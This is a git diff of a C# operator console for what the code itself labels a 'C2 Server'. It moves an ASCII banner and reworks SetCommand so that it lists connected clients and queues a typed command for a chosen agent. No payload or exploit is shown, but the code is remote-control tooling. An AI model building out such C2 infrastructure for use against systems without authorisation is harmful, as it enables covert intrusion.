@@ -13,12 +13,6 @@ namespace server{
         public UserInput(Listener listener){
             //pass our listener into this object
             this.listener = listener;
-        }
-
-        private string Menu(){
-            //returns a menu
-            //should be made generic and with input
-            //in the constructor *theoretically*
             Console.WriteLine(@"
 _________         _________ _               ______   _______ 
 \__   __/|\     /|\__   __/( (    /|       (  __  \ (  ____ )
@@ -30,6 +24,13 @@ _________         _________ _               ______   _______
    )_(   |/     \|\_______/|/    )_)       (______/ |/   \__/
                                                              
             ");
+        }
+
+        private string Menu(){
+            //returns a menu
+            //should be made generic and with input
+            //in the constructor *theoretically*
+            Console.WriteLine("");
             return "C2 Server User Input\n\t[1] Exit the program\n\t[2] List all Clients\n\t[3] Set a Command";
         }
 
@@ -67,18 +68,24 @@ _________         _________ _               ______   _______
             }
         }
 
-        public void SetCommand(){
+        public int SetCommand(){
             //set a command for a client to query
             //set the "query buffer" to be json including the hostname and the command
-            Console.WriteLine("Which client would you like to send a command to: ");
+            Console.WriteLine("Type the name of the client you would like to send a command to: ");
+            Console.WriteLine("List: ");
+            ListClients();
+            Console.Write("\n");
             string client = Console.ReadLine();
             foreach (var agent in this.listener.agents){
                 if(client == agent.name){
                     Console.WriteLine("What command do you want to run: ");
                     string command = Console.ReadLine();
                     agent.commandQue.AddLast(command);
+                    return 0;
                 }
             }
+            Console.WriteLine("Client not found");
+            return 1;
         }
     }
 }
